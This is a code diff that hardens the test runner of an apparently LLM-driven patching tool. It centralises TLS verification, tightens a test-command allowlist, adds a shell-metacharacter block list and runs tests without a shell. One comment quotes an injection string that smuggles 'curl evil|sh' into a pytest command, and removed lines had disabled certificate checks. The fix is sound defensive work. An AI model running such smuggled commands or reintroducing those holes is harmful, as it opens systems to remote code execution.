@@ -16,9 +16,11 @@ const { execFileSync } = require("child_process");
 const { tokenizeCommand, safeExec } = require("./safe-exec");
 const https = require("https");
 
-// Node's built-in CA bundle sometimes can't verify API provider certs on Windows.
-// The API key in the Authorization header is the real auth mechanism here.
-const llmAgent = new https.Agent({ rejectUnauthorized: false });
+// TLS-verification gate is centralized in lib/insecure-tls.js so all three LLM-call
+// sites share one source of truth — insecure ONLY on Windows or with an explicit
+// LANTERN_INSECURE_TLS=1, never unconditionally (the response here is applied as a
+// code diff, so an MITM would be RCE). #869
+const { llmAgent } = require("./insecure-tls");
 
 const MAX_OUTPUT = 8000;
 const MAX_DIFF_SIZE = 128000;
@@ -485,6 +487,8 @@ const ALLOWED_TESTS = [
   /^node tests\/test_dream_journal_keystone\.js$/,
   /^node tests\/test_dream_chat_self_edit\.js$/,
   /^node tests\/test_convergance_routing\.js$/,
+  // Closed character class (no shell metachars) — the greedy `(.+)` here was an
+  // injection surface: `python -m pytest tests/x;curl evil|sh.py` matched. #873
   /^python -m pytest tests\/[\w./-]+\.py$/,
   /^npm test$/,
   /^npm run test$/,
@@ -492,6 +496,28 @@ const ALLOWED_TESTS = [
 
 function isAllowedTest(cmd) {
   return ALLOWED_TESTS.some((re) => re.test(cmd));
+}
+
+// Shell metacharacters that must never reach an executed command. The allowlist
+// regexes already exclude them; this is the second, no-shell layer. #873
+const SHELL_META = /[;&|$`(){}<>\n\r\\"'*?~]/;
+const ALLOWED_TEST_BINS = new Set(["node", "python", "npm", "npx"]);
+
+// Split an allowlisted command into argv with NO shell involvement, rejecting any
+// token bearing a shell metacharacter. Returns argv; throws on an unsafe token.
+function tokenizeAllowedCommand(cmd) {
+  const argv = String(cmd).trim().split(/ +/);
+  for (const t of argv) {
+    if (!t || SHELL_META.test(t)) throw new Error("unsafe_command_token");
+  }
+  return argv;
+}
+
+function resolveAllowedTestBinary(bin) {
+  const normalized = String(bin || "").trim();
+  if (!ALLOWED_TEST_BINS.has(normalized)) throw new Error("unsafe_command_bin");
+  if (process.platform === "win32" && (normalized === "npm" || normalized === "npx")) return normalized + ".cmd";
+  return normalized;
 }
 
 // opts.env overrides the child environment — used to point NODE_PATH at the main
@@ -504,8 +530,17 @@ function runTests(repoRoot, testCommands, opts = {}) {
       results.push({ cmd, ok: false, error: "test_not_allowlisted", output: "" });
       continue;
     }
+    let argv;
+    let bin;
     try {
-      const out = safeExec(tokenizeCommand(cmd), { cwd: repoRoot, encoding: "utf8", timeout: 60000, maxBuffer: 1024 * 1024, env });
+      argv = tokenizeAllowedCommand(cmd);
+      bin = resolveAllowedTestBinary(argv[0]);
+    } catch {
+      results.push({ cmd, ok: false, error: "test_command_unsafe", output: "" });
+      continue;
+    }
+    try {
+      const out = execFileSync(bin, argv.slice(1), { cwd: repoRoot, encoding: "utf8", timeout: 60000, maxBuffer: 1024 * 1024, env, shell: false });
       results.push({ cmd, ok: true, output: out.slice(0, MAX_OUTPUT), truncated: out.length > MAX_OUTPUT });
     } catch (err) {
       results.push({
@@ -1021,6 +1056,7 @@ module.exports = {
   generatePatch,
   callLlm,
   isAllowedTest,
+  tokenizeAllowedCommand,
   requireSafePaths,
   resolveRepoPath,
 };
